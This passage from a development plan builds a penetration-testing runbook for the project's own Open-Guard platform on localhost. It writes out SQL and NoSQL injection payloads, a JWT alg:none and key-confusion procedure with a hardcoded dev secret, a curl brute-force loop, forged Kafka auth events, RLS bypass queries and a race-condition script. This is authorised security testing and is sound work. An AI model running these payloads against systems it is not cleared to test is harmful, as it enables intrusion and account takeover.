1. **SQL injection on every endpoint** with Intruder + Collaborator payloads
2. **MongoDB `$regex` injection** on audit event filter params
3. **Redis key collision:** Craft JWT with JTI that already exists in blocklist
4. **ClickHouse timing injection** on compliance stats `from`/`to` params
5. **Param Miner** on every authenticated endpoint to discover hidden parameters

#### Layer 4 — Manual Burp Steps

1. **Autorize baseline scan:**
   - Record baseline: admin session
   - Set low-priv cookie: user_a session
   - Run Autorize on all authenticated endpoints
2. **Turbo Intruder race conditions:**
   - Refresh token race: 30 pipelined requests with same refresh_token
   - User creation race: 30 pipelined requests with different emails (no idempotency key)
   - MFA verification race: 30 pipelined requests with same challenge code
3. **Business logic:**
   - SAML assertion replay (capture valid → resend)
   - OAuth2 code injection (capture auth code → use with different redirect_uri)
   - Policy evaluation bypass (craft payload that returns `allow: true`)
```

- [ ] **Step 1: Save the runbook section as a reference document**

Write `pentest/manual-runbook.md`:

Write the content from "Manual Testing Runbook" section above (Layers 1-4 manual steps).

```bash
cat > pentest/manual-runbook.md << 'RUNBOOK'
# Open-Guard Pentest Manual Runbook

## Layer 1 — Perimeter (Burp Suite)

### Configure Proxy
1. Open Burp Suite > Proxy > Options > Add listener: `127.0.0.1:8081`
2. Set browser to use Burp proxy
3. Browse to `http://localhost:4200` (Angular dashboard)
4. Browse to `http://localhost:8080` (Gateway API)

### CORS Testing
```
OPTIONS /auth/login HTTP/1.1
Host: localhost:8080
Origin: https://evil.com
Access-Control-Request-Method: GET
```
- Check response for `Access-Control-Allow-Origin: https://evil.com`

### JWKS Examination
```
GET /auth/jwks HTTP/1.1
Host: localhost:8080
```
- Note the `kty`, `alg`, `kid` values
- The KID `dev-key` with symmetric HS256 means the same key signs and verifies

### JWT Manipulation (JWT Editor)
1. Load dev secret as Symmetric Key: `dev-secret-at-least-32-chars-long-!!`
2. Create JWT with `alg: none`:
   - Modify header in JWT Editor > New > None algorithm
   - Set payload claims: `{"sub":"admin","org_id":"alpha","role":"admin"}`
3. Send to `GET /auth/me` and `GET /mgmt/users`
4. If `alg: none` is rejected, try key confusion: use JWK public key as HMAC secret

### Brute Force / Lockout
- Siege: `for i in {1..20}; do curl -s -X POST localhost:8080/auth/login -d '{"email":"admin@alpha.openguard.local","password":"wrong'$i'"}' -o /dev/null; done`
- Check account lockout by attempting valid credentials after 10 failures
- Verify lockout escalates: 15min → 30min → 60min → up to 24h

## Layer 2 — Service Mesh

### mTLS Bypass
```
GET /mgmt/users HTTP/1.1
Host: localhost:8082
```
- Direct connection to IAM on port 8082 without client cert
- Expected: should reject (mTLS optional), but may accept if cert not required

### Internal Key Injection
```
GET /mgmt/users HTTP/1.1
Host: localhost:8080
X-Internal-Key: test
Authorization: Bearer <any-jwt>
```
- Can we elevate privileges by adding the internal key header?

### Kafka Event Injection
```bash
# Subscribe to see real events
kcat -C -b localhost:9092 -t auth.events -o end

# Inject a crafted auth event
echo '{"type":"LOGIN_SUCCESS","email":"admin@alpha.openguard.local","source_ip":"127.0.0.1","timestamp":"2026-05-09T00:00:00Z"}' | kcat -P -b localhost:9092 -t auth.events
```

## Layer 3 — Data Layer

### RLS Session Leakage (Bulk Test)
```bash
# Use psql to check if RLS is properly enforced
psql $PG_URL -c "SELECT current_setting('app.current_org_id', true);"
psql $PG_URL -c "SET LOCAL app.current_org_id = 'other-org-id'; SELECT * FROM users LIMIT 5;"
```

### SQL Injection — All Entry Points
Use Intruder with these PostgreSQL payloads on every parameter:
- `' OR 1=1--`
- `'; SELECT pg_sleep(5)--`
- `' UNION SELECT NULL,NULL,NULL--`
- `' AND 1=CAST((SELECT pg_sleep(3)) AS text)--`
- `' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--`

### MongoDB NoSQL Injection
```json
// Parameter injection test
{"email": {"$regex": ".*"}, "password": {"$ne": ""}}
{"email": {"$gt": ""}, "password": {"$gt": ""}}
{"email": "admin@test.com", "password": {"$ne": ""}}
```

## Layer 4 — Business Logic

### Autorize Role Matrix
1. Set baseline: Capture request with admin session
2. Set low-priv: Configure user_a cookie
3. Run Autorize: It replays all admin requests with user_a cookie
4. Review: Flag any 200/OK responses (indicates privilege escalation)

### Turbo Intruder — Refresh Token Race
```python
# Turbo Intruder race script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, i)
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

### Race Conditions to Test
1. **MFA enable**: Capture enable request, send 5 parallel requests
2. **Refresh token**: Same token sent 30 times in parallel
3. **User creation**: Same idempotency key, parallel POST
4. **Policy evaluate**: Same request, track if cache causes wrong decision
5. **SSE subscription**: While permissions revoke, check if stream persists

### SAML Assertion Replay
1. Hit POST /auth/saml/acs with valid SAML response from test IdP
2. Capture the raw SAML XML
3. Resend exact same XML — should return error (replay protection)
4. If allowed: Critical finding
RUNBOOK
```

- [ ] **Step 2: Commit**

```bash
git add pentest/manual-runbook.md
git commit -m "feat: add manual pentest runbook with Burp procedures"
```

---

### Task 8: Verification & Dry Run

- [ ] **Step 1: Verify all scripts are executable**

```bash
chmod +x pentest/scripts/*.sh
ls -la pentest/scripts/
```

Expected: All `.sh` files executable (`-rwxr-xr-x`).

- [ ] **Step 2: Run shellcheck on all scripts**

```bash
shellcheck pentest/scripts/*.sh 2>/dev/null || echo "shellcheck not installed, skipping"
```

- [ ] **Step 3: Verify config loads without errors**

```bash
bash -c "source pentest/config.sh && echo 'Config loaded OK'"
```

Expected: `Config loaded OK`

- [ ] **Step 4: Show final pentest tree**

```bash
find pentest -type f | sort
```

Expected output resembles:
```
pentest/README.md
pentest/config.sh
pentest/manual-runbook.md
pentest/reports/evidence/README.md
pentest/reports/findings/README.md
pentest/scripts/endpoint-enum.sh
pentest/scripts/get-tokens.sh
pentest/scripts/health-check.sh
pentest/scripts/jwt-attacks.sh
pentest/scripts/kafka-inject.sh
pentest/scripts/race-condition.sh
pentest/scripts/report-template.md
pentest/scripts/rls-bypass.sh
pentest/scripts/sql-injection.sh
pentest/scripts/ssrf-proxy.sh
pentest/burp-configs/openguard-scope.json
```

- [ ] **Step 5: Final commit**

```bash
git add pentest/
git commit -m "feat: complete pentest infrastructure — automation scripts, Burp config, runbook, and reporting templates"
```

---

### Post-Commit: Execution Handoff

Once committed, the pentest is ready to run. The operator should:

1. Start the Open-Guard environment: `make dev`
2. Generate test data: `make seed` (if not auto-seeded)
3. Source config: `source pentest/config.sh`
4. Verify connectivity: `./pentest/scripts/health-check.sh`
5. Get tokens: `./pentest/scripts/get-tokens.sh`
6. Run Layer 1 automation: `./pentest/scripts/endpoint-enum.sh && ./pentest/scripts/jwt-attacks.sh`
7. Configure Burp with `pentest/burp-configs/openguard-scope.json`
8. Follow manual-runbook.md for Burp testing
9. Run remaining automated scripts per layer
10. Document findings in `pentest/reports/findings/` using the template
